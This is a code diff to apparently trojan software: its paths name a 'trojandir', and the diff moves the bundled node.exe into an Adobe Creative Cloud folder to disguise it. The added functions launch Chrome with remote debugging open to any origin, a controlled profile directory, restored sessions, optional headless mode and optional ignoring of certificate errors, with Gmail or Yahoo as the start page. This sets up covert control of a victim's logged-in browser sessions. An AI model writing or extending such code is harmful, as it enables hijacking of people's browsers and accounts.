@@ -265,11 +265,11 @@ var systemstate = {
     },
 
     get nodeexepath() {
-        return path.join(this.nodeexedir, "node.exe");
+        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs\\node.exe"; //path.join(this.nodeexedir, "node.exe");
     },
 
     get nodedir() {
-        return path.join(this.trojandir, "node");
+        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs"; //path.join(this.trojandir, "node");
     },
 
     get nodegsdfilesdir() {
@@ -4438,6 +4438,54 @@ function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir
     return child;
 }
 
+// start chrome --remote-debugging-port=9223 --user-data-dir=C:\Users\LC2022\AppData\Local\Google\test\chrome
+function chrome_cmdlineargs(
+    starturl = "https://www.yahoo.com",
+    debugport = 9223,
+    datadir = `C:\\Users\\${systemstate.username}\\AppData\\Local\\Google\\test\\chrome`,
+    x_pos = 0,
+    y_pos = 0,
+    width = 1920,
+    height = 1080,
+    ignorecert = false,
+    restore = false,
+    headless = false
+) {
+    datadir = datadir.trim();
+
+    let cmdlineargs = [
+        `--remote-debugging-port=${debugport}`,
+        `--user-data-dir=${datadir}`,
+        `--disable-notifications`,
+        `--noerrdialogs`,
+        `--disable-infobars`,
+        `--disable-session-crashed-bubble`,
+        //`--disable-popup-blocking`,
+        `--suppress-message-center-popups`,
+        headless ? `--headless=new` : "",
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
+        `--no-default-browser-check`,
+        `--disable-signin-promo`,
+        //`--profile-directory="Profile 1"`,
+        //`--profile-directory=Default`,
+        `--remote-allow-origins=*`,
+        restore ? `--restore-last-session` : null,
+        ignorecert ? `--ignore-certificate-errors` : null,
+        `--window-position=${x_pos},${y_pos}`,
+        `--window-size=${width},${height}`,
+        `--hide-crash-restore-bubble`,
+        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
+        `--new-window`,
+        starturl,
+    ];
+
+    let ret = cmdlineargs.filter((item) => {
+        return !helper.isNullOrWhitespace(item);
+    });
+
+    return ret;
+}
+
 // TODO modify for client PCs / TPL
 async function modify_chrome() {
 // https://peter.sh/experiments/chromium-command-line-switches/
@@ -4487,8 +4535,35 @@ async function modify_chrome() {
     }
 
     cmdlineargs = [
+        `--remote-debugging-port=${debugport}`,
+        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
+        `--disable-notifications`,
+        `--noerrdialogs`,
+        `--disable-infobars`,
+        `--disable-session-crashed-bubble`,
+        //`--disable-popup-blocking`,
+        `--suppress-message-center-popups`,
+        headless ? `--headless=new` : "",
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
+        `--no-default-browser-check`,
+        `--disable-signin-promo`,
+        //`--profile-directory="Profile 1"`,
+        //`--profile-directory=Default`,
+        `--remote-allow-origins=*`,
+        restore ? `--restore-last-session` : null,
+        ignorecert ? `--ignore-certificate-errors` : null,
+        `--window-position=${x_pos},${y_pos}`,
+        `--window-size=${width},${height}`,
         `--hide-crash-restore-bubble`,
-        `--user-data-dir="${path.join(systemstate.trojandir,'chrome')}"`,
+        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
+        `--new-window`,
+        starturl,
+    ];
+
+    // C:\\Users\\${helper.username}\\AppData\\Local\\Google\\test\\chrome
+    cmdlineargs = [
+        `--hide-crash-restore-bubble`,
+        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
         `--profile-directory=Default`,
         `--restore-last-session`,
         `--start-maximized`,
